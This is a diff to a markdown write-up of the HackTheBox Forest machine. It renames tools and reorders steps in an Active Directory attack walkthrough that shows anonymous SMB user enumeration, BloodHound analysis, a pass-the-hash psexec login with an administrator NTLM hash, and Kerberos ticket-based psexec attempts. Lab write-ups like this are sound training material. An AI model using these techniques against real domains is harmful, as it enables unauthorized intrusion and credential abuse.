@@ -2,7 +2,7 @@
 
 ## HackTheBox
 
-### Forest - Machine
+### Machine: Forest
 
 #### Machine Description
 
@@ -14,20 +14,20 @@
 
 #### Tools Used
 
-- BloodHound
-- CrackMapExec
-- Evil-WinRM
+- bloodhound
+- crackmapexec
+- evil-winrm
 - impacket-GetNPUsers
+- impacket-psexec
 - impacket-secretsdump
 - impacket-smbserver
 - impacket-ticketer
-- Kerbrute
-- John the Ripper
+- kerbrute
+- john
 - ldapsearch
-- Nmap
-- PowerView (PowerSploit)
-- PsExec
-- SharpHound
+- nmap
+- powerview.ps1 (PowerSploit)
+- sharphound.ps1
 
 #### Machine Writeup
 
@@ -211,12 +211,12 @@ Service Info: Host: FOREST; OS: Windows
 Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
 ```
 
-`echo -e '10.10.10.161\tFOREST.htb.local\tFOREST\thtb.local' | tee -a /etc/hosts`:
+`echo -e '10.10.10.161\tFOREST.htb.local FOREST htb.local' | tee -a /etc/hosts`:
 ```
-10.10.10.161    FOREST.htb.local    FOREST    htb.local ←
+10.10.10.161    FOREST.htb.local FOREST htb.local ←
 ```
 
-`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users | tee ./out.txt`:
+`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users`:
 ```
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
@@ -285,6 +285,8 @@ userPrincipalName: mark@htb.local ←
 ```
 
 </🔄 Alternative Step>
+
+`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users > ./out.txt`
 
 `cat ./out.txt | tail -n 5 | awk '{print $5}' | cut -d '\' -f2 | tee ./domain_users.txt`:
 ```
@@ -568,9 +570,11 @@ Mode                LastWriteTime         Length Name
 
 `bloodhound`
 
-`Upload Data: ~/smbshare/bh.zip` > `Clear Finished`
-
 `Database Info` > `Refresh Database Stats`
+`Database Info` > `Clear Sessions`
+`Database Info` > `Clear Database`
+
+`Upload Data: ~/smbshare/bh.zip` > `Clear Finished`
 
 `Search for a node: svc-alfresco` > `SVC-ALFRESCO@HTB.LOCAL` > `<right-click>` > `Mark User as Owned`
 
@@ -939,7 +943,7 @@ SMB         10.10.10.161    445    FOREST           [+] Executed command via wmi
 SMB         10.10.10.161    445    FOREST           htb\administrator ←
 ```
 
-`psexec.py 'htb.local/administrator@10.10.10.161' -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
+`impacket-psexec 'htb.local/administrator@10.10.10.161' -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
@@ -1213,7 +1217,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 <❌ Failed Step>
 
-`psexec.py 'htb.local/h4x0r@10.10.10.161' -k -no-pass`:
+`impacket-psexec 'htb.local/h4x0r@10.10.10.161' -k -no-pass`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
@@ -1224,7 +1228,7 @@ Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
 <❌ Failed Step>
 
-`psexec.py 'htb.local/h4x0r@forest' -k -no-pass`:
+`impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
@@ -1239,7 +1243,7 @@ Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 CLOCK: time stepped by 408.084919
 ```
 
-`psexec.py 'htb.local/h4x0r@forest' -k -no-pass`:
+`impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
